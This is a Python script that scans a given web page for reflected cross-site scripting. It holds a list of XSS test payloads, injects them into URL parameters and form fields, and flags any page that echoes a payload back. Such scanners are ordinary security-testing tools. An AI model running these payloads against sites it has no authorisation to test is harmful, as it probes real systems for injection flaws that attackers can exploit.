import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin

# Common payloads to test for XSS
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"'><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
]

def find_forms(url):
    """Extract all forms from the target page."""
    try:
        res = requests.get(url, timeout=10)
        soup = BeautifulSoup(res.text, "html.parser")
        return soup.find_all("form")
    except:
        return []

def get_form_details(form):
    """Extract form attributes and input fields."""
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        name = input_tag.attrs.get("name")
        type_ = input_tag.attrs.get("type", "text")
        value = input_tag.attrs.get("value", "")
        inputs.append({"name": name, "type": type_, "value": value})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, payload):
    """Submit the form with the XSS payload."""
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        if input["type"] == "text" or input["type"] == "search":
            data[input["name"]] = payload
        else:
            data[input["name"]] = input["value"]

    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data, timeout=10)
        else:
            return requests.get(target_url, params=data, timeout=10)
    except:
        return None

def scan_xss(url):
    results = {"url": url, "vulnerable": False, "payloads": [], "reflected": []}
    
    # 1. Check URL with payloads directly
    for payload in XSS_PAYLOADS:
        test_url = f"{url}?xss_test={payload}"
        try:
            res = requests.get(test_url, timeout=10)
            if payload in res.text:
                results["vulnerable"] = True
                results["payloads"].append(payload)
                results["reflected"].append(test_url)
        except:
            continue

    # 2. Check all forms for XSS injection
    forms = find_forms(url)
    for form in forms:
        details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            response = submit_form(details, url, payload)
            if response and payload in response.text:
                results["vulnerable"] = True
                results["payloads"].append(payload)
                results["reflected"].append(urljoin(url, details["action"]))

    return results
